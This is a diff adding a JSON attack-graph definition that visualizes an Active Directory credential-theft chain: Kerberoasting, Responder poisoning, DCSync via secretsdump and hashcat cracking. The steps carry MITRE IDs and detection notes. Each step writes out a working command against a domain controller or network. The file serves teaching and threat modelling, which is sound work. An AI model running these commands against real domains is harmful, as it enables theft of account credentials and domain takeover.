@@ -1,0 +1,307 @@
+{
+  "title": "Kerberoast and Captured Credential Material Pipeline",
+  "version": "3.0",
+  "description": "Multi-source credential material pipeline combining Kerberoast, responder captures, and directory replication outputs into format-specific offline cracking.",
+  "shortDescription": "Kerberoast Credential Pipeline",
+  "tags": [
+    "password-cracking",
+    "active-directory",
+    "kerberoast",
+    "credential-dumping",
+    "credential-access"
+  ],
+  "metadata": {
+    "descriptionHtml": "<p>This graph represents a broad acquisition-to-crack chain where ticket material, protocol captures, and directory replication outputs are unified into one artifact pool. The flow highlights <span style='color:#ef4444;font-weight:bold;'>Kerberoasting</span>, responder-derived captures, and NTDS extraction before routing each format into matching cracking modes.</p>",
+    "commandsBlock": "# Step 1: Collect Kerberoast tickets\n$ GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast\n\n# Step 2: Expand capture sources\n$ sudo python3 Responder.py -I eth0 -v\n\n# Step 3: Dump directory material\n$ secretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>\n\n# Step 4: Crack by format\n$ hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt\n$ hashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt",
+    "extraInfo": [
+      "Impacket GetUserSPNs.py and secretsdump.py",
+      "Rubeus/targetedKerberoast variant collection paths",
+      "Hashcat mode families: 13100, 19600, 19700, 7500, 5600, 1000"
+    ],
+    "prerequisites": [
+      "AD/KDC reachability and valid assessment scope",
+      "Sufficient privileges or position for ticket/capture/replication collection",
+      "Prepared cracking dictionaries/rulesets"
+    ],
+    "attackerGains": [
+      "Service-account and domain-account credential material",
+      "Recovered plaintext credentials for lateral movement and privilege escalation"
+    ],
+    "detectionNotes": [
+      "Detect anomalous spikes in TGS requests for service accounts",
+      "Enable SMB signing and reduce relay/capture exposure",
+      "Alert on replication abuse patterns associated with DCSync/secretsdump"
+    ],
+    "mitreCategories": [
+      "T1558.003",
+      "T1557.001",
+      "T1003.006",
+      "T1110.002",
+      "T1078"
+    ]
+  },
+  "entities": [
+    {
+      "id": "attacker_environment",
+      "type": "container",
+      "label": "Acquisition and Cracking Environment",
+      "icon": "IconKali",
+      "members": [
+        "operator_node",
+        "acquisition_toolchain",
+        "responder_capture",
+        "captured_artifact_pool",
+        "cracking_farm",
+        "recovered_credentials"
+      ],
+      "position": {
+        "x": 694.05,
+        "y": 228.5
+      }
+    },
+    {
+      "id": "ad_core",
+      "type": "container",
+      "label": "AD Core",
+      "icon": "IconActiveDirectory",
+      "members": [
+        "domain_controller_kdc",
+        "service_account_set",
+        "ntds_store"
+      ],
+      "position": {
+        "x": 69.29999999999995,
+        "y": 196.475
+      }
+    },
+    {
+      "id": "operator_node",
+      "type": "node",
+      "label": "Operator Host",
+      "icon": "IconKali",
+      "position": {
+        "x": 980.7,
+        "y": 260.525
+      }
+    },
+    {
+      "id": "acquisition_toolchain",
+      "type": "node",
+      "label": "Acquisition Toolchain",
+      "icon": "IconPenetrationTool",
+      "position": {
+        "x": 980.7,
+        "y": 388.625
+      }
+    },
+    {
+      "id": "responder_capture",
+      "type": "node",
+      "label": "Responder Capture Path",
+      "icon": "IconInfectedService",
+      "position": {
+        "x": 407.4,
+        "y": 68.375
+      }
+    },
+    {
+      "id": "captured_artifact_pool",
+      "type": "node",
+      "label": "Captured Artifact Pool",
+      "icon": "IconHash",
+      "position": {
+        "x": 407.4,
+        "y": 260.525
+      }
+    },
+    {
+      "id": "cracking_farm",
+      "type": "node",
+      "label": "Format-Specific Crack Engines",
+      "icon": "IconTerminal",
+      "position": {
+        "x": 598.5,
+        "y": 260.525
+      }
+    },
+    {
+      "id": "recovered_credentials",
+      "type": "node",
+      "label": "Recovered Credential Set",
+      "icon": "IconStolenCredential",
+      "position": {
+        "x": 789.6,
+        "y": 260.525
+      }
+    },
+    {
+      "id": "domain_controller_kdc",
+      "type": "node",
+      "label": "Domain Controller / KDC",
+      "icon": "IconDC",
+      "position": {
+        "x": 69.29999999999995,
+        "y": 196.475
+      }
+    },
+    {
+      "id": "service_account_set",
+      "type": "node",
+      "label": "SPN Service Account Targets",
+      "icon": "IconUser",
+      "position": {
+        "x": 69.29999999999995,
+        "y": 68.375
+      }
+    },
+    {
+      "id": "ntds_store",
+      "type": "node",
+      "label": "NTDS Credential Store",
+      "icon": "IconDatabase",
+      "position": {
+        "x": 69.29999999999995,
+        "y": 324.575
+      }
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "type": "edge",
+      "name": "Request Kerberos Service Tickets",
+      "from": "domain_controller_kdc",
+      "to": "captured_artifact_pool",
+      "icon": "IconTicket",
+      "cli": "GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast",
+      "description": "Collect TGS material for SPN-bearing accounts to seed Kerberoast cracking workflows.",
+      "mitre": {
+        "id": "T1558.003",
+        "tactic": "Credential Access",
+        "technique": "Kerberoasting"
+      }
+    },
+    {
+      "id": 2,
+      "type": "edge",
+      "name": "Capture Additional Auth Artifacts",
+      "from": "service_account_set",
+      "to": "responder_capture",
+      "icon": "IconNetwork",
+      "cli": "sudo python3 Responder.py -I eth0 -v",
+      "description": "Expand artifact coverage with relay/poisoning-driven captures from additional auth protocols.",
+      "mitre": {
+        "id": "T1557.001",
+        "tactic": "Credential Access",
+        "technique": "LLMNR/NBT-NS Poisoning and SMB Relay"
+      }
+    },
+    {
+      "id": 3,
+      "type": "edge",
+      "name": "Dump Domain Replication Material",
+      "from": "ntds_store",
+      "to": "captured_artifact_pool",
+      "icon": "IconDownload",
+      "cli": "secretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>",
+      "description": "Use replication abuse path to pull domain-scale credential material into the shared artifact pool.",
+      "mitre": {
+        "id": "T1003.006",
+        "tactic": "Credential Access",
+        "technique": "DCSync"
+      }
+    },
+    {
+      "id": 4,
+      "type": "edge",
+      "name": "Route Artifacts to Matching Crack Modes",
+      "from": "captured_artifact_pool",
+      "to": "cracking_farm",
+      "icon": "IconProcess",
+      "cli": "hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt",
+      "description": "Dispatch each artifact family to mode-aligned cracking commands for throughput and parser correctness.",
+      "mitre": {
+        "id": "T1110.002",
+        "tactic": "Credential Access",
+        "technique": "Password Cracking"
+      }
+    },
+    {
+      "id": 5,
+      "type": "edge",
+      "name": "Recover Credentials from Crack Outputs",
+      "from": "cracking_farm",
+      "to": "recovered_credentials",
+      "icon": "IconStolenCredential",
+      "cli": "hashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt",
+      "description": "Aggregate successful crack outcomes across ticket, challenge-response, and NTDS-derived inputs.",
+      "mitre": {
+        "id": "T1110.002",
+        "tactic": "Credential Access",
+        "technique": "Password Cracking"
+      }
+    },
+    {
+      "id": 6,
+      "type": "edge",
+      "name": "Consolidate Valid Account Access",
+      "from": "recovered_credentials",
+      "to": "operator_node",
+      "icon": "IconCheck",
+      "description": "Recovered credential set is consolidated for controlled access validation and escalation testing.",
+      "mitre": {
+        "id": "T1078",
+        "tactic": "Initial Access",
+        "technique": "Valid Accounts"
+      }
+    }
+  ],
+  "visibility": {
+    "attacker_environment": {
+      "start": 0,
+      "end": 100
+    },
+    "ad_core": {
+      "start": 0,
+      "end": 100
+    },
+    "operator_node": {
+      "start": 0,
+      "end": 100
+    },
+    "acquisition_toolchain": {
+      "start": 0,
+      "end": 100
+    },
+    "domain_controller_kdc": {
+      "start": 0,
+      "end": 100
+    },
+    "service_account_set": {
+      "start": 0,
+      "end": 100
+    },
+    "ntds_store": {
+      "start": 0,
+      "end": 100
+    },
+    "responder_capture": {
+      "start": 2,
+      "end": 100
+    },
+    "captured_artifact_pool": {
+      "start": 1,
+      "end": 100
+    },
+    "cracking_farm": {
+      "start": 4,
+      "end": 100
+    },
+    "recovered_credentials": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false
+}
